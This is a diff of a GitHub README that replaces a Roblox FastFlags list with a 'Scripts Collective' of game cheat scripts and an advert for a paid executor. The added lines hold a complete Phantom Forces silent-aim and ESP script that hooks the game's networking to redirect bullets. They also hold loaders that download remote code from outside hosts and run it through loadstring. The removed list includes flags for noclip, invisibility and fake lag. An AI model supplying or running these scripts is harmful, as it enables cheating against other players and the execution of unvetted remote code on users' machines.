@@ -1,30 +1,25 @@
 > [!IMPORTANT]
-> its finally over 🙏🏽
+> MSG &nbsp; <br> [![Discord Presence](https://lanyard.cnrad.dev/api/996636510088601650?theme=dark&bg=00000&animated=false&hideDiscrim=true&borderRadius=30px&idleMessage=I'm%20currently%20beating%20my%20dick~&showDisplayName=true)](https://discord.com/users/996636510088601650) for submissions
 
-<h1 align="center"><img src="https://github.com/pizzaboxer/bloxstrap/raw/main/Images/Bloxstrap.png" width="28"/> FastFlags Collective</h1>
+<h1 align="center"><img src="https://i.imgur.com/O5jfEFH.png" width="28"/> Scripts Collective</h1>
 
 <h3 align="center">https://discord.gg/Q5JKyzuNRC</h3>
 
 <h6 align="center">https://discord.gg/fastflags</h6>
 
 ##### [3/1/2024]
-* **106 Currently Listed**
+* **2 Currently Listed**
 
 ## How to Use:
-1. **Open the [Bloxstrap Menu](https://github.com/pizzaboxer/bloxstrap).**
-2. **Navigate to `Fast Flags` >> `Fast Flags Editor` >> `Import Json`.**
-3. **Paste in the JSON.**
-4. **Save and you're good to go!**
-<img src="/assets/tutorial.gif" width="750"/>
+### BUY KRAMPUS FROM [BloxProducts](https://bloxproducts.com/#f0)
+* Instant Delivery
+* Cheapest
+* Purchase with Robux
+* Popular Payment Methods
 
  # List Navigation
-* **[Rendering](https://github.com/FastFlags/FastFlags-Collective/?tab=readme-ov-file#rendering)**
-* **[Graphical](https://github.com/FastFlags/FastFlags-Collective/?tab=readme-ov-file#graphical-settings)**
-* **[UI](https://github.com/FastFlags/FastFlags-Collective/?tab=readme-ov-file#user-interface)**
-* **[Textures](https://github.com/FastFlags/FastFlags-Collective/?tab=readme-ov-file#textures)**
-* **[Physics](https://github.com/FastFlags/FastFlags-Collective/?tab=readme-ov-file#physics)**
-* **[Other FFlags](https://github.com/FastFlags/FastFlags-Collective/?tab=readme-ov-file#other-fflags)**
-* **[Links](https://github.com/FastFlags/FastFlags-Collective/?tab=readme-ov-file#links)**
+* **[Harmful](https://github.com/FastFlags/FastFlags-Collective/?tab=readme-ov-file#Harmful)**
+* **[Non-Harmful](https://github.com/FastFlags/FastFlags-Collective/?tab=readme-ov-file#)**
 
 <img src="assets/images/bitdancer.png" width="888"/>
 
@@ -32,533 +27,929 @@
 
 <h3 align="center">══════⊹⊱≼≽⊰⊹══════</h3>
 
-### FPS Unlocker in Roblox Menu Settings
-```json
-{ "FFlagGameBasicSettingsFramerateCap": "True", "DFIntTaskSchedulerTargetFps": "0" }
+
+<h1 align="center">Harmful</h1>
+
+### Phantom Forces: Silent Aim, ESP
+```lua
+local scriptSource = [[
+    local silentaim = {
+        enabled = true,
+        fovEnabled = true,
+        fovSize = 500,
+        fovCircleEnabled = true,
+        fovCircleColor = Color3.fromRGB(255, 255, 255),
+        hitPercent = 100,
+        headShotPercent = 100
+    }
+    local enemyesp = {
+        boxCorners = true,
+        boxLineSize = 0.33, -- 0.5 max
+        boxColor = Color3.fromRGB(255, 99, 99),
+        boxCornerOutline = true,
+        names = true,
+        nameSize = 12,
+        nameOffset = 6,
+        nameColor = Color3.fromRGB(255, 255, 255),
+        nameOutline = true,
+        healthBars = true,
+        healthBarOffset = -5,
+        healthBarThickness = 2,
+        healthBarOutline = true,
+        skeleton = true,
+        skeletonThickness = 1,
+        skeletonColor = Color3.fromRGB(255, 255, 255)
+    }
+
+    local requireModule
+    for i, v in next, getgc(false) do
+        if type(v) == "function" and debug.getinfo(v).name == "require" and islclosure(v) then
+            requireModule = v
+            break
+        end
+    end
+
+    local publicSettings = requireModule("PublicSettings")
+    local replication = requireModule("ReplicationInterface")
+    local bulletObject = requireModule("BulletObject")
+    local network = requireModule("NetworkClient")
+
+    local runService = game:GetService("RunService")
+    local workspace = game:GetService("Workspace")
+    local players = game:GetService("Players")
+
+    local currentCamera = workspace.CurrentCamera
+    local localplayer = players.LocalPlayer
+    local ignore = workspace.Ignore
+    local new = bulletObject.new
+    local zero = Vector3.zero
+    local send = network.send
+    local dot = zero.Dot
+
+    local espData = {}
+    local healthbarData = game:HttpGet("https://i.imgur.com/FpnD6XG.png")
+    local defaultProperties = {
+        Thickness = 1,
+        Filled = false,
+        Transparency = 1,
+        Outline = false,
+        Center = true,
+        Visible = false
+    }
+
+    local fovCircle = Drawing.new("Circle")
+    fovCircle.Position = currentCamera.ViewportSize * 0.5
+    fovCircle.Visible = silentaim.fovCircleEnabled
+    fovCircle.Color = silentaim.fovCircleColor
+    fovCircle.Radius = silentaim.fovSize
+    fovCircle.Transparency = 1
+    fovCircle.Filled = false
+    fovCircle.NumSides = 32
+
+    local function getClosest(partName, fov)
+        local distance, position, closestPlayer, part = fov or math.huge, nil, nil, nil
+        fovCircle.Position = currentCamera.ViewportSize * 0.5
+    
+        replication.operateOnAllEntries(function(player, entry)
+            local character = entry._thirdPersonObject and entry._thirdPersonObject._characterHash
+
+            if character and player.Team ~= localplayer.Team then
+                local screenPosition, onscreen = currentCamera:WorldToViewportPoint(character[partName].Position)
+                local screenDistance = (Vector2.new(screenPosition.X, screenPosition.Y) - fovCircle.Position).Magnitude
+    
+                if screenPosition.Z > 0 and screenDistance < distance then
+                    part = character[partName]
+                    position = part.Position
+                    distance = screenDistance
+                    closestPlayer = entry
+                end
+            end
+        end)
+
+        return position, closestPlayer, part
+    end
+
+    local function trajectory(o, a, t, s, e)
+        local f = -a
+        local ld = t - o
+        local a = dot(f, f)
+        local b = 4 * dot(ld, ld)
+        local k = (4 * (dot(f, ld) + s * s)) / (2 * a)
+        local v = (k * k - b / a) ^ 0.5
+        local t, t0 = k - v, k + v
+
+        t = t < 0 and t0 or t; t = t ^ 0.5
+        return f * t / 2 + (e or zero) + ld / t, t
+    end
+
+    local missChance
+    local headChance
+    function network:send(name, ...)
+        if name == "newbullets" and silentaim.enabled and missChance <= silentaim.hitPercent then
+            local position, entry, head = getClosest(headChance > silentaim.headShotPercent and "Torso" or "Head", silentaim.fovEnabled and silentaim.fovSize)
+
+            if position then
+                local a, data, time, b = ...
+                local velocity = trajectory(data.firepos, publicSettings.bulletAcceleration, position, data.bullets[1][1].Magnitude, entry._velspring.t)
+
+                for i = 1, #data.bullets do
+                    data.bullets[i][1] = velocity
+                end
+
+                return send(self, name, a, data, time, b)
+            end
+        end
+
+        return send(self, name, ...)
+    end
+
+    function bulletObject.new(data)
+        if silentaim.enabled and data.onplayerhit and missChance <= silentaim.hitPercent then
+            local position, entry, head = getClosest(headChance > silentaim.headShotPercent and "Torso" or "Head", silentaim.fovEnabled and silentaim.fovSize)
+
+            if position then
+                data.velocity = trajectory(data.position, publicSettings.bulletAcceleration, position, data.velocity.Magnitude, entry._velspring.t)
+            end
+        end
+
+        return new(data)
+    end
+
+    task.spawn(function()
+        while task.wait(0.1) do
+            missChance = math.random(1, 100)
+            headChance = math.random(1, 100)
+        end
+    end)
+
+    function draw(shape)
+        local drawing = Drawing.new(shape)
+
+        for i, v in pairs(defaultProperties) do
+            pcall(function()
+                drawing[i] = v
+            end)
+        end
+
+        return drawing
+    end
+
+    function getSquarePositions(character)
+        local top = currentCamera:WorldToViewportPoint(character.Head.Position + Vector3.yAxis)
+        local middle = currentCamera:WorldToViewportPoint(character.Torso.Position)
+        local left = currentCamera:WorldToViewportPoint(character["Left Arm"].Position)
+        local right = currentCamera:WorldToViewportPoint(character["Right Arm"].Position)
+
+        local leftSize, rightSize
+        if left.X < right.X then
+            leftSize = "Left Arm"
+            rightSize = "Right Arm"
+        else
+            leftSize = "Left Arm"
+            rightSize = "Right Arm"
+        end
+
+        left = currentCamera:WorldToViewportPoint(character[leftSize].Position - currentCamera.CFrame.RightVector)
+        right = currentCamera:WorldToViewportPoint(character[leftSize].Position + currentCamera.CFrame.RightVector)
+
+        local size = Vector2.new(math.abs(left.X - right.X) * 2, (middle.Y - top.Y) * 2.2)
+
+        return Vector2.new(middle.X - size.X * 0.5, top.Y), size
+    end
+
+    runService.Heartbeat:Connect(function()
+        local alive = ignore:FindFirstChild("RefPlayer")
+
+        replication.operateOnAllEntries(function(player, entry)
+            local data = espData[player]
+
+            if not data then
+                data = {}
+                data.visible = false
+                data.entry = entry
+                data.drawings = {
+                    line100 = draw("Line"),
+                    line101 = draw("Line"),
+                    line110 = draw("Line"),
+                    line111 = draw("Line"),
+                    line120 = draw("Line"),
+                    line121 = draw("Line"),
+                    line130 = draw("Line"),
+                    line131 = draw("Line"),
+                    line000 = draw("Line"),
+                    line001 = draw("Line"),
+                    line010 = draw("Line"),
+                    line011 = draw("Line"),
+                    line020 = draw("Line"),
+                    line021 = draw("Line"),
+                    line030 = draw("Line"),
+                    line031 = draw("Line"),
+                    name = draw("Text"),
+                    skeletonhead = draw("Line"),
+                    skeletonlarm = draw("Line"),
+                    skeletonrarm = draw("Line"),
+                    skeletonlleg = draw("Line"),
+                    skeletonrleg = draw("Line"),
+                    healthbaroutline = draw("Square"),
+                    healthbarimage = draw("Image"),
+                    healthbarsquare = draw("Square"),
+                }
+                for drawingName, drawing in next, data.drawings do
+                    if string.find(drawingName, "line1") then
+                        drawing.Thickness = 3
+                        drawing.Color = Color3.fromRGB(0, 0, 0)
+                    end
+                end
+                data.drawings.name.Text = player.Name
+                data.drawings.healthbarsquare.Filled = true
+                data.drawings.healthbaroutline.Filled = true
+                data.drawings.healthbaroutline.Color = Color3.fromRGB(0, 0, 0)
+                data.drawings.healthbarimage.Data = healthbarData
+                data.drawings.healthbarimage.Visible = true
+                data.setVisibility = function(visible)
+                    data.drawings.name.Visible = visible and enemyesp.names
+                    data.drawings.line000.Visible = visible and enemyesp.boxCorners
+                    data.drawings.line001.Visible = visible and enemyesp.boxCorners
+                    data.drawings.line010.Visible = visible and enemyesp.boxCorners
+                    data.drawings.line011.Visible = visible and enemyesp.boxCorners
+                    data.drawings.line020.Visible = visible and enemyesp.boxCorners
+                    data.drawings.line021.Visible = visible and enemyesp.boxCorners
+                    data.drawings.line030.Visible = visible and enemyesp.boxCorners
+                    data.drawings.line031.Visible = visible and enemyesp.boxCorners
+                    data.drawings.line100.Visible = visible and enemyesp.boxCorners and enemyesp.boxCornerOutline
+                    data.drawings.line101.Visible = visible and enemyesp.boxCorners and enemyesp.boxCornerOutline
+                    data.drawings.line110.Visible = visible and enemyesp.boxCorners and enemyesp.boxCornerOutline
+                    data.drawings.line111.Visible = visible and enemyesp.boxCorners and enemyesp.boxCornerOutline
+                    data.drawings.line120.Visible = visible and enemyesp.boxCorners and enemyesp.boxCornerOutline
+                    data.drawings.line121.Visible = visible and enemyesp.boxCorners and enemyesp.boxCornerOutline
+                    data.drawings.line130.Visible = visible and enemyesp.boxCorners and enemyesp.boxCornerOutline
+                    data.drawings.line131.Visible = visible and enemyesp.boxCorners and enemyesp.boxCornerOutline
+                    data.drawings.skeletonhead.Visible = visible and enemyesp.skeleton
+                    data.drawings.skeletonlarm.Visible = visible and enemyesp.skeleton
+                    data.drawings.skeletonrarm.Visible = visible and enemyesp.skeleton
+                    data.drawings.skeletonlleg.Visible = visible and enemyesp.skeleton
+                    data.drawings.skeletonrleg.Visible = visible and enemyesp.skeleton
+                    data.drawings.healthbaroutline.Visible = visible and enemyesp.healthBars and enemyesp.healthBarOutline
+                    data.drawings.healthbarimage.Transparency = visible and enemyesp.healthBars and 1 or 0
+                    data.drawings.healthbarimage.Visible = visible and enemyesp.healthBars
+                    data.drawings.healthbarsquare.Visible = visible and enemyesp.healthBars
+                    data.visible = visible
+                end
+
+                espData[player] = data
+            end
+
+            if (not entry._alive and data.visible) or not alive then
+                data.setVisibility(false)
+            end
+        end)
+
+        if alive and alive:FindFirstChild("HumanoidRootPart") then
+            for player, data in next, espData do
+                if data.entry._alive and data.entry._player.Team ~= players.LocalPlayer.Team then
+                    local character = data.entry._thirdPersonObject and data.entry._thirdPersonObject._characterHash
+
+                    if character then
+                        local screenPosition, onScreen = currentCamera:WorldToViewportPoint(character.Head.Position)
+
+                        if onScreen and screenPosition.Z > 0 then
+                            if not data.visible then
+                                data.setVisibility(true)
+                            end
+                            
+                            local boxPosition, boxSize, middle
+                            if enemyesp.boxCorners or enemyesp.names or enemyesp.healthBars then
+                                boxPosition, boxSize = getSquarePositions(character)
+                                middle = boxPosition + boxSize * 0.5
+                            end
+
+                            local p0, p1, p2, p3, sx, sy, p00, p01, p10, p11, p20, p21, p30, p31
+                            if enemyesp.boxCorners then
+                                sx, sy = Vector2.new(boxSize.X, 0), Vector2.new(0, boxSize.Y)
+                                p0, p1, p2, p3 = boxPosition, boxPosition + sx, boxPosition + sy, boxPosition + sx + sy
+                                sx, sy = sx * enemyesp.boxLineSize, sy * enemyesp.boxLineSize
+                                p00, p01, p10, p11, p20, p21, p30, p31 = p0 + sx, p0 + sy, p1 - sx, p1 + sy, p2 + sx, p2 - sy, p3 - sx, p3 - sy
+
+                                data.drawings.line000.From = p0
+                                data.drawings.line001.From = p0
+                                data.drawings.line000.To = p00
+                                data.drawings.line001.To = p01
+                                data.drawings.line010.From = p1
+                                data.drawings.line011.From = p1
+                                data.drawings.line010.To = p10
+                                data.drawings.line011.To = p11
+                                data.drawings.line020.From = p2
+                                data.drawings.line021.From = p2
+                                data.drawings.line020.To = p20
+                                data.drawings.line021.To = p21
+                                data.drawings.line030.From = p3
+                                data.drawings.line031.From = p3
+                                data.drawings.line030.To = p30
+                                data.drawings.line031.To = p31
+
+                                for drawingName, drawing in next, data.drawings do
+                                    if string.find(drawingName, "line0") then
+                                        drawing.Color = enemyesp.boxColor
+                                    end
+                                end
+                            end
+                            
+                            if data.drawings.line100.Visible then
+                                data.drawings.line100.From = p0
+                                data.drawings.line101.From = p0
+                                data.drawings.line100.To = p00
+                                data.drawings.line101.To = p01
+                                data.drawings.line110.From = p1
+                                data.drawings.line111.From = p1
+                                data.drawings.line110.To = p10
+                                data.drawings.line111.To = p11
+                                data.drawings.line120.From = p2
+                                data.drawings.line121.From = p2
+                                data.drawings.line120.To = p20
+                                data.drawings.line121.To = p21
+                                data.drawings.line130.From = p3
+                                data.drawings.line131.From = p3
+                                data.drawings.line130.To = p30
+                                data.drawings.line131.To = p31
+                            end
+
+                            if enemyesp.names then
+                                local name = data.drawings.name
+                                name.Position = Vector2.new(middle.X, boxPosition.Y + (enemyesp.nameOffset < 0 and boxSize.Y or 0) - enemyesp.nameOffset - enemyesp.nameSize * 0.5)
+                                name.Size = enemyesp.nameSize
+                                name.Color = enemyesp.nameColor
+                                name.Outline = enemyesp.nameOutline
+                            end
+
+                            if enemyesp.healthBars then
+                                local healthbarimage = data.drawings.healthbarimage
+                                local healthbarsquare = data.drawings.healthbarsquare
+                                local health = (data.entry._healthstate.health0 ~= 0 and data.entry._healthstate.health0 or 100) * 0.01
+                                local squareSize = boxSize.Y * (1 - health)
+                                healthbarimage.Position = Vector2.new(boxPosition.X + (enemyesp.healthBarOffset > 0 and boxSize.X or 0) + enemyesp.healthBarOffset - enemyesp.healthBarThickness * 0.5, boxPosition.Y)
+                                healthbarimage.Size = Vector2.new(enemyesp.healthBarThickness, boxSize.Y)
+                                healthbarsquare.Position = healthbarimage.Position
+                                healthbarsquare.Size = Vector2.new(enemyesp.healthBarThickness, squareSize)
+                            end
+
+                            if data.drawings.healthbaroutline.Visible then
+                                local healthbaroutline = data.drawings.healthbaroutline
+                                healthbaroutline.Position = data.drawings.healthbarimage.Position - Vector2.new(1, 1)
+                                healthbaroutline.Size = data.drawings.healthbarimage.Size + Vector2.new(2, 2)
+                            end
+
+                            if enemyesp.skeleton then
+                                local rootPos = currentCamera:WorldToViewportPoint(character.Torso.Position)
+                                local larmPos = currentCamera:WorldToViewportPoint(character["Left Arm"].Position)
+                                local rarmPos = currentCamera:WorldToViewportPoint(character["Right Arm"].Position)
+                                local llegPos = currentCamera:WorldToViewportPoint(character["Left Leg"].Position)
+                                local rlegPos = currentCamera:WorldToViewportPoint(character["Right Leg"].Position)
+                                
+                                local drawings = data.drawings
+                                drawings.skeletonhead.To = Vector2.new(screenPosition.X, screenPosition.Y)
+                                drawings.skeletonlarm.To = Vector2.new(larmPos.X, larmPos.Y)
+                                drawings.skeletonrarm.To = Vector2.new(rarmPos.X, rarmPos.Y)
+                                drawings.skeletonlleg.To = Vector2.new(llegPos.X, llegPos.Y)
+                                drawings.skeletonrleg.To = Vector2.new(rlegPos.X, rlegPos.Y)
+
+                                local fromPos = Vector2.new(rootPos.X, rootPos.Y)
+                                for drawingName, drawing in next, drawings do
+                                    if string.find(drawingName, "skeleton") then
+                                        drawing.Thickness = enemyesp.skeletonThickness
+                                        drawing.Color = enemyesp.skeletonColor
+                                        drawing.From = fromPos
+                                    end
+                                end
+                            end
+                        elseif data.visible then
+                            data.setVisibility(false)
+                        end
+                    end
+                end
+            end
+        end
+    end)
+
+    players.PlayerRemoving:Connect(function(player)
+        player = espData[player]
+
+        if player then
+            player.setVisibility(false)
+
+            for _, drawing in next, player.drawings do
+                drawing:Remove()
+            end
+
+            espData[player] = nil
+        end
+    end)
+]]
+
+local requireModule
+for i, v in next, getgc(false) do
+    if type(v) == "function" and debug.getinfo(v).name == "require" and islclosure(v) then
+        requireModule = v
+        break
+    end
+end
+
+if requireModule then
+    loadstring(scriptSource)()
+else
+    queue_on_teleport("task.wait(5);" .. scriptSource)
+    setfflag("DebugRunParallelLuaOnMainThread", "True")
+    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
+end
+```
+### Universal: Eclipse Hub
+#### https://eclipsehub.xyz/
+```lua
+getgenv().mainKey = "nil";
+
+local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+```
+### Criminality: Moonlight
+#### https://moonhub.lol/
+```lua
+loadstring(game:HttpGet("https://hideout.one/api/cdn/loader"))()
 ```
 
-<h1 align="center">Rendering API</h1>
+<h4 align="center">Non-Harmful</h4>
 
-### Metal
-###### MacOS Only
-```json
-{ "FFlagDebugGraphicsPreferMetal": "True" }
-```
-### Vulkan
-```json
-{ "FFlagDebugGraphicsDisableDirect3D11": "True", "FFlagDebugGraphicsPreferVulkan": "True" }
-```
-### OpenGL
-```json
-{ "FFlagDebugGraphicsDisableDirect3D11": "True", "FFlagDebugGraphicsPreferOpenGL": "True" }
-```
-### Direct X 10
-```json
-{ "FFlagDebugGraphicsPreferD3D11FL10": "True" }
-```
-### Direct X 11
-```json
-{ "FFlagDebugGraphicsPreferD3D11": "True" }
-```
+### Universal: AntiChatLogger
+#### https://github.com/AnthonyIsntHere/
+```lua
+if not game:IsLoaded() then
+    game.Loaded:wait()
+end
 
-<h1 align="center">Graphical Settings <sup>& other stuff</sup></h1>
+local ACL_LoadTime = tick()
+local NotificationTitle = "Anthony's ACL"
 
-### Draws a circle under avatars
-```json
-{ "FFlagDebugAvatarChatVisualization": "True", "FFlagEnableInGameMenuChromeABTest2": "False" }
-```
-### Smoother Terrain
-```json
-{ "FFlagDebugRenderingSetDeterministic": "True" }
-```
-### Graphics Quality Level
-```json
-{ "FIntRomarkStartWithGraphicQualityLevel": "1" }
-```
-### Low Quallity Terrain Textures
-###### 4 for less quality 16, 32, 64 for higher quality
-```json
-{ "FIntTerrainArraySliceSize": "4" }
-```
-### Disable Shadows
-```json
-{ "FIntRenderShadowIntensity": "0" }
-```
-### Preserve rendering quality with display setting
-```json
-{ "DFFlagDisableDPIScale": "True" }
-```
-### Low Graphics Quality w/ Max Render Distance/FRM Quality Levels
-###### Explanation: 1-6 Are low graphics, Above 6 are high graphics. Like the 1-21 graphics slider
-```json
-{ "DFIntDebugFRMQualityLevelOverride": "1" }
-```
-
-<h4 align="center">FRM Levels</h4>
-
-```
-Low
-
-1 = 3
-2 = 2
-3 = 6
-
-High
-
-4 = 7
-5 = 11
-6 = 14
-7 = 15 
-8 = 17
-9 = 18
-10 = 21
-```
-
-### Low Render Distance
-###### [FRM](https://github.com/FastFlags/FastFlags-Collective/?tab=readme-ov-file#frm-levels)
-```json
-{ "DFIntDebugRestrictGCDistance": "1" }
-```
-### Disable Wind
-```json
-{ "FFlagGlobalWindRendering": "False", "FFlagGlobalWindActivated": "False" }
-```
-### Limits light updates
-```json
-{ "FIntRenderLocalLightUpdatesMax": "8", "FIntRenderLocalLightUpdatesMin": "6" }
-```
-### Disables fade in and fade out animation every light update
-###### changes fade in ms!!
-```json
-{ "FIntRenderLocalLightFadeInMs": "0" }
-```
-### Makes avatars shiny 
-###### [everything goes black on <3] ***[DFIntDebugFRMQualityLevelOverride is there to set your graphics to 10, You can change it to anything above 3: [Click here to view](https://github.com/FastFlags/FastFlags-Collective/?tab=readme-ov-file#frm-levels) ]***
-```json
-{ "DFIntRenderClampRoughnessMax": "-640000000", "DFIntDebugFRMQualityLevelOverride": "6" }
-```
-### Disable PostFX
-```json
-{ "FFlagDisablePostFx": "True" }
-```
-### Pause Voxelizer/Disable Baked Shadows
-```json
-{ "DFFlagDebugPauseVoxelizer": "True" }
-```
-### Gray Sky
-###### Only works with games with default sky
-```json
-{ "FFlagDebugSkyGray": "True" }
-```
-### Disable Player Shadows
-```json
-{ "FIntRenderShadowIntensity": "0" }
-```
-### Force LOD on Meshes
-```json
-{ "DFIntCSGLevelOfDetailSwitchingDistance": "0", "DFIntCSGLevelOfDetailSwitchingDistanceL12": "0", "DFIntCSGLevelOfDetailSwitchingDistanceL23": "0", "DFIntCSGLevelOfDetailSwitchingDistanceL34": "0" }
-```
-### Lighting Attenuation
-```json
-{ "FFlagNewLightAttenuation": "True" }
-```
-### Enable GPULightCulling
-###### Combine with [Lighting Attenuation](https://github.com/FastFlags/FastFlags-Collective/?tab=readme-ov-file#lighting-attenuation) for better vision
-```json
-{ "FFlagFastGPULightCulling3": "True" }
-```
-### Frame Buffer
-###### Explnation: 0 makes white screen 1-3 makes other players have laggy movement, 4 is stable has better performance than 10 and less input lag
-```json
-{ "DFIntMaxFrameBufferSize": "4" }
-```
-### High Quality Textures 
-###### *[1-3]*
-```json
-{ "DFFlagTextureQualityOverrideEnabled": "True", "DFIntTextureQualityOverride": "3" }
-```
-### Lower Quality Textures 
-###### *[1-3]*
-```json
-{ "DFIntPerformanceControlTextureQualityBestUtility": "-1" }
-```
-### no player textures
-```json
-{ "DFIntTextureCompositorActiveJobs": "0" }
-```
-### Remove Grass
-```json
-{ "FIntFRMMinGrassDistance": "0", "FIntFRMMaxGrassDistance": "0", "FIntRenderGrassDetailStrands": "0", "FIntRenderGrassHeightScaler": "0" }
-```
-### Force MSAA 
-###### *[0, 1, 2, 4, 8]*
-```json
-{ "FIntDebugForceMSAASamples": "4" }
-```
-### ShadowMap Bias 
-###### ***[Future & ShadowMap]***
-```json
-{ "FIntRenderShadowmapBias": "75" }
-```
-### Enables Network Debug Tracker menu
-##### Instructions: CTRL+F8
-```json
-{ "DFFlagDebugEnableInterpolationVisualizer": "True" }
-```
-### Humanoid Outline
-##### Draws an outline around every part and every humanoid
-```json
-{ "DFFlagDebugDrawBroadPhaseAABBs": "True" }
-```
-### Buggy ZPlane Camera *<sup>a.k.a xray</sup>*
-```json
-{ "FIntCameraFarZPlane": "1" }
-```
-<h1 align="center">User Interface</h1>
-
-### Darker Dark Theme
-```json
-{ "FFlagLuaAppUseUIBloxColorPalettes1":"True", "FFlagUIBloxUseNewThemeColorPalettes":"True" }
-```
-### Subscriptions Page
-```json
-{ "FFlagLuaAppDevSubsEnabled":"True" }
-```
-### No Transparency V4 Menu **(2023)**
-```json
-{ "FStringInGameMenuModernizationStickyBarForcedUserIds": "UserID" }
-```
-### Revert Old Report Menu
-```json
-{ "FStringReportAbuseMenuRoactForcedUserIds": "UserID_HERE", "FFlagEnableReportAbuseMenuRoactABTest2": "False", "FFlagEnableReportAbuseMenuRoact2": "False", "FFlagEnableReportAbuseMenuLayerOnV3": "False" }
-```
-
-### Custom MicroProfile Scale
-```json
-{ "DFIntMicroProfilerDpiScaleOverride": "100" }
-```
-### Hides gui
-```json
-{ "FFlagDebugAdornsDisabled": "True" }
-```
-### Dont Render UI
-```json
-{ "FFlagDebugDontRenderUI": "True" }
-```
-### Enable Audio Controller
-```json
-{ "FFlagTrackerLodControllerDebugUI": "True" }
-```
-### Disable Autocomplete
-```json
-{ "FFlagEnableCommandAutocomplete": "False" }
-```
-### Chrome UI TopBar
-```json
-{ "FFlagEnableInGameMenuChrome": "True", "FFlagEnableReportAbuseMenuRoactABTest2": "True", "FFlagChromeBetaFeature": "True", "FFlagEnableReportAbuseMenuRoactABTest2": "True" }
-```
-### Pin Chat on Chrome UI
-```json
-{ "FFlagEnableChromePinnedChat": "True" }
-```
-### Chrome UI Topbar Removal
-```json
-{ "FFlagChromeBetaFeature": "False", "FFlagEnableChromePinnedChat": "False", "FFlagEnableInGameMenuChrome": "False", "FFlagEnableInGameMenuChromeABTest2": "False", "FFlagEnableInGameMenuChromeSignalAPI": "False", "FFlagPlayerListChromePushdown": "False", "FFlagEnableReportAbuseMenuRoactABTest2": "False" }
-```
-### Disable Bubble Chat
-```json
-{ "FFlagEnableBubbleChatFromChatService": "False" }
-```
-### Disable Selfview
-```json
-{ "FFlagCoreGuiTypeSelfViewPresent": "False" }
-```
-### Remove VC Beta Badge
-```json
-{ "FFlagVoiceBetaBadge": "False", "FFlagTopBarUseNewBadge": "False", "FFlagEnableBetaBadgeLearnMore": "False", "FFlagBetaBadgeLearnMoreLinkFormview": "False", "FFlagControlBetaBadgeWithGuac": "False", "FStringVoiceBetaBadgeLearnMoreLink": "null" }
-```
-### Hide guis
-###### ***Instructions: Replace "ID" with any group ID that you are in.***
-```json
-{ "DFIntCanHideGuiGroupId": "ID_HERE" }
-```
-### Disable Fullscreen Title Bar
-```json
-{ "FIntFullscreenTitleBarTriggerDelayMillis": "3600000" }
-```
-### Set Custom Font Size
-```json
-{ "FIntFontSizePadding": "1" }
-```
-
-<h1 align="center">Textures</h1>
-
-### Fix Textures
-```json
-{ "FFlagMSRefactor5": "False" }
-```
-### No Textures
-```json
-{
-    "FStringPartTexturePackTable2022": "{\"glass\":{\"ids\":[\"rbxassetid://9873284556\",\"rbxassetid://9438453972\"],\"color\":[254,254,254,7]}}",
-    "FStringPartTexturePackTablePre2022": "{\"glass\":{\"ids\":[\"rbxassetid://7547304948\",\"rbxassetid://7546645118\"],\"color\":[254,254,254,7]}}",
-    "FStringTerrainMaterialTable2022": "",
-    "FStringTerrainMaterialTablePre2022": ""
+local OldCoreTypeSettings = {}
+local WhitelistedCoreTypes = {
+    "Chat",
+    "All",
+    Enum.CoreGuiType.Chat,
+    Enum.CoreGuiType.All
 }
-```
-<h1 align="center">Physics</h1>
 
+local OldCoreSetting = nil
 
-### arsenal fly glitch
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
+local TextChatService = game:GetService("TextChatService")
+local Players = game:GetService("Players")
 
-![image](https://github.com/FastFlags/FastFlags-Collective/assets/159259392/ee3bfafa-5c6f-4cf5-92ed-bf6bbc597e77)
+local Player = Players.LocalPlayer
 
-### Disables PGS Solver
-###### Projected Gauss-Seidel physics, or PGS physics, is a more reliable but more costly physics solver released in summer of 2015. The solver has a lot less "give" than spring physics, in terms of parts won't want to go into each other at all, making joints less flexible. This allows for parts to have less of a tendency to go through each other. As of October 21, 2015, the joints called glue joints are supported in the system, and will not break under pressure. The solver takes more processing power to work over spring physics, which will cause games to act slower. This solver runs at 240 Hz.
-```json
-{ "FFlagSimDefaultPGSSolver": "False" }
-```
-### rc car
-###### https://www.roblox.com/bundles/63/Mage-Animation-Package
-```json
-{ "DFIntHipHeightClamp": "-48" }
-```
-### No Animations
-```json
-{ "DFIntReplicatorAnimationTrackLimitPerAnimator": "-1" }
-```
-### Stick unanchored parts to you
-##### - = up, + = down
-```json
-{ "DFIntSolidFloorPercentForceApplication": "-1000", "DFIntNonSolidFloorPercentForceApplication": "-5000" }
-```
-### Max Raycast Distance
-###### Raycasting is the use of intersection tests to solve problems in ROBLOX. The most common use of raycasting is to determine the first object intersected by a ray. This is done by casting a virtual ray from a certain point in a direction and determining the first surface it intersected with.
-###### Break legs collision from 2 to -inf, kinda break camera on values over 3 noclip cam on 3
-```json
-{ "DFIntRaycastMaxDistance": "3" }
-```
-### Possible Super Jump
-```json
-{ "DFIntNewRunningBaseGravityReductionFactorHundredth": "1500" }
-```
-<!--
-### Change DataSender Rate
-###### a.k.a dos not let you load games
-```json
-{ "DFIntDataSenderRate": "-1" }
-```
- -->
-### Fake Lag
-```json
-{ "DFIntS2PhysicsSenderRate": "1" }
-```
-### Invisible
-```json
-{ "DFIntS2PhysicsSenderRate": "-30" }
-```
-### Invisible 
-###### Sets your position to 0,0,0 for the server
-```json
-{ "DFIntGameNetPVHeaderTranslationZeroCutoffExponent": "10" }
-```
+local Notify = function(_Title, _Text , Time)
+    StarterGui:SetCore("SendNotification", {Title = _Title, Text = _Text, Icon = "rbxassetid://2541869220", Duration = Time})
+end
 
-### Warp & Physics FPS cap
-```json
-{ "DFIntMaxMissedWorldStepsRemembered": "1" }
-```
-```json
-{ "DFIntMaxMissedWorldStepsRemembered": "1000" }
-```
-### Noclip
-###### adjust the value so u dont fall through the ground
-```json
-{ "DFFlagAssemblyExtentsExpansionStudHundredth": "-50" }
-```
-### Hip Height
-###### Very controllable bounce, only works with negative values, 0 allows you to hover
-```json
-{ "DFIntMaxAltitudePDStickHipHeightPercent": "-200" }
-```
-### Wallglide
-```json
-{ "DFIntUnstickForceAttackInTenths": "-4" }
-```
+local Tween = function(Object, Time, Style, Direction, Property)
+    return TweenService:Create(Object, TweenInfo.new(Time, Enum.EasingStyle[Style], Enum.EasingDirection[Direction]), Property)
+end
 
